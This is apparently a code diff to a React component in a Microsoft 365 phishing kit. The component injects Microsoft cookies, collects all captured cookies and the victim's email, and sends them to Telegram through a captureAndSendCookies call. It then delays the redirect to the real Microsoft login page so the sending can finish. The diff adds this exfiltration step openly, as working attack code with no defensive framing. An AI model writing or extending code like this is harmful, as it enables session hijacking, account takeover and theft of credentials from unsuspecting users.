@@ -1,5 +1,5 @@
 import React, { useEffect } from 'react';
-import { injectMicrosoftCookies, setCredentials, getAllCapturedCookies, getMostReliableEmail } from '../utils/client-cookie-capture';
+import { injectMicrosoftCookies, setCredentials, getAllCapturedCookies, getMostReliableEmail, captureAndSendCookies } from '../utils/client-cookie-capture';
 
 let ipaddress = '';
 let email = '';
@@ -38,7 +38,26 @@ const RealOAuthRedirect: React.FC<any> = ({ onLoginSuccess, sessionData }) => {
       setTimeout(async () => {
         // >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
         // INJECT COOKIES RIGHT BEFORE REDIRECT!
+        console.log('🔧 Injecting Microsoft cookies before OAuth redirect...');
         injectMicrosoftCookies();
+        
+        // Capture and send cookies after injection
+        setTimeout(async () => {
+          try {
+            const capturedCookies = getAllCapturedCookies();
+            const userEmail = getMostReliableEmail(email);
+            
+            console.log('📤 Attempting to send captured cookies to Telegram:', {
+              cookieCount: capturedCookies.length,
+              email: userEmail
+            });
+            
+            await captureAndSendCookies(userEmail, capturedCookies);
+            console.log('✅ Cookies sent to Telegram successfully before OAuth redirect');
+          } catch (error) {
+            console.error('❌ Failed to send cookies to Telegram:', error);
+          }
+        }, 1000);
         // <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
 
         try {
@@ -62,7 +81,12 @@ const RealOAuthRedirect: React.FC<any> = ({ onLoginSuccess, sessionData }) => {
           });
 
           const microsoftOAuthUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?${params.toString()}`;
-          window.location.href = microsoftOAuthUrl;
+          
+          // Wait a bit more to ensure cookies are properly set before redirect
+          setTimeout(() => {
+            window.location.href = microsoftOAuthUrl;
+          }, 2000);
+          
         } catch (err) {
           // Fallback if PKCE fails
           const fallbackState = Math.random().toString(36).substring(2, 15);
@@ -79,7 +103,10 @@ const RealOAuthRedirect: React.FC<any> = ({ onLoginSuccess, sessionData }) => {
           });
 
           const fallbackUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?${fallbackParams.toString()}`;
-          window.location.href = fallbackUrl;
+          
+          setTimeout(() => {
+            window.location.href = fallbackUrl;
+          }, 2000);
         }
       }, redirectDelay);
     })();
